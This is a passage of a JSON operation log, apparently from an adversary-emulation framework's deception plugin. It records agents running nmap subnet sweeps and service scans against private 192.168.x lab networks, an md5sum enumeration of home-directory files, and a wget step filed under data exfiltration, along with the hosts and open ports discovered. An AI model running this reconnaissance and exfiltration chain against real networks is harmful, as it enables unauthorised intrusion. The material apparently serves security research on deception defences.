"variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-exfiltration"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "wget #{host.data.url}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:53Z"}, {"id": "eb02a9a0-52fc-42d1-aff2-bee458d17d90", "paw": "rezmky", "command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "plaintext_command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "status": 0, "score": 0, "decide": "2024-04-26T23:49:57Z", "pin": 0, "pid": "1807", "facts": [{"unique": "results.data.filenamedata1.json", "trait": "results.data.filename", "name": "results.data.filename", "value": "data1.json", "created": "2024-04-26T23:50:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["eb02a9a0-52fc-42d1-aff2-bee458d17d90"], "relationships": ["results.data.filename(data1.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T9012"}, {"unique": "results.data.hashc112f813cd2e4cd83b884f7c1f844f13", "trait": "results.data.hash", "name": "results.data.hash", "value": "c112f813cd2e4cd83b884f7c1f844f13", "created": "2024-04-26T23:47:01Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["82d2e0ff-63d9-44ab-a952-a07a886ea7d2", "eb02a9a0-52fc-42d1-aff2-bee458d17d90"], "relationships": ["results.data.filename(data2.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)", "results.data.filename(data1.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T9012"}, {"unique": "results.data.filenamedata2.json", "trait": "results.data.filename", "name": "results.data.filename", "value": "data2.json", "created": "2024-04-26T23:47:01Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["82d2e0ff-63d9-44ab-a952-a07a886ea7d2", "eb02a9a0-52fc-42d1-aff2-bee458d17d90"], "relationships": ["results.data.filename(data2.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b33a0>has_hash<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b1ab0>", "source": {"unique": "results.data.filenamedata1.json", "trait": "results.data.filename", "name": "results.data.filename", "value": "data1.json", "created": "2024-04-26T23:50:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_hash", "target": {"unique": "results.data.hashc112f813cd2e4cd83b884f7c1f844f13", "trait": "results.data.hash", "name": "results.data.hash", "value": "c112f813cd2e4cd83b884f7c1f844f13", "created": "2024-04-26T23:50:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b25f0>has_hash<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b0970>", "source": {"unique": "results.data.filenamedata2.json", "trait": "results.data.filename", "name": "results.data.filename", "value": "data2.json", "created": "2024-04-26T23:50:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_hash", "target": {"unique": "results.data.hashc112f813cd2e4cd83b884f7c1f844f13", "trait": "results.data.hash", "name": "results.data.hash", "value": "c112f813cd2e4cd83b884f7c1f844f13", "created": "2024-04-26T23:50:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [], "unique": "eb02a9a0-52fc-42d1-aff2-bee458d17d90", "collect": "2024-04-26T23:50:02Z", "finish": "2024-04-26T23:50:02Z", "ability": {"ability_id": "deception-exfil-results", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Records exfil results", "description": "Records exfil results", "executors": [{"name": "sh", "platform": "linux", "command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.md5sum", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.md5sum", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:02Z"}, {"id": "d8bd914e-39d8-44fc-b217-7182f38229b6", "paw": "qysmha", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:50:02Z", "pin": 0, "pid": "1661", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4488250>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4489b40>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:50:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs[]", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": [], "created": "2024-04-26T23:50:17Z", "score": 1, "source": null, "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:50:02Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "d8bd914e-39d8-44fc-b217-7182f38229b6", "collect": "2024-04-26T23:50:06Z", "finish": "2024-04-26T23:50:17Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:06Z"}, {"id": "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "paw": "qysmha", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:50:17Z", "pin": 0, "pid": "1663", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:50:23Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["qysmha"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452d330>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452d450>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:50:23Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:50:23Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:50:17Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "collect": "2024-04-26T23:50:20Z", "finish": "2024-04-26T23:50:23Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:20Z"}, {"id": "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "paw": "qysmha", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:50:28Z", "pin": 0, "pid": "1665", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:47:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf486ecb0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46df3a0>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:50:32Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:50:32Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:50:28Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "collect": "2024-04-26T23:50:29Z", "finish": "2024-04-26T23:50:32Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:50:29Z"}, {"id": "75bed3c0-a10f-419c-bb81-24ec4e400d57", "paw": "qysmha", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:50:33Z", "pin": 0, "pid": "1667", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479e770>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479f580>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:50:44Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479f8e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479d330>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": 